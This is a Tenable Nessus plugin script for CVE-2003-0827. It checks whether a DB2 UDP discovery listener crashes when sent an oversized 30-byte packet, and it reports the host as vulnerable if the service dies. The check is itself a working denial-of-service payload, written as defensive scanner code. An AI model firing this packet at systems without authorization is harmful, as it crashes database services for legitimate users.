#
# (C) Tenable Network Security, Inc.
#
#
# References:
# Date: Thu, 18 Sep 2003 20:17:36 -0400
# From: "Aaron C. Newman" <aaron@NEWMAN-FAMILY.COM>
# Subject: AppSecInc Security Alert: Denial of Service Vulnerability in DB2 Discovery Service
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#


include("compat.inc");

if(description)
{
 script_id(11896);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2003-0827");
 script_bugtraq_id(8653);
 script_xref(name:"OSVDB", value:"2169");

 script_name(english:"DB2 Discovery Service Malformed UDP Packet Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote service is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the DB2 UDP-based discovery listener on the
remote host by sending it a packet with more than 20 bytes.  An
unauthenticated attacker may use this attack to make this service
crash continuously, thereby denying service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/338234/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8d0c33a1" );
 script_set_attribute(attribute:"solution", value:
"Apply FixPak 10a or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"A large UDP packet kills the remote service");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_dependencies("db2_discovery_detect.nasl");
 script_require_udp_ports("Services/udp/db2_ds");
 exit(0);
}

#

include("global_settings.inc");
include("network_func.inc");

if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/udp/db2_ds");
if (! port || ! get_udp_port_state(port)) exit(0);

# There is probably a clean way to do it and change this script to 
# an ACT_GATHER_INFO or ACT_MIXED...

if (! test_udp_port(port: port)) exit(0);

s = open_sock_udp(port);
if (! s) exit(0);
send(socket: s, data: crap(30));
close(s);

if (! test_udp_port(port: port)) security_warning(port:port, proto:"udp");
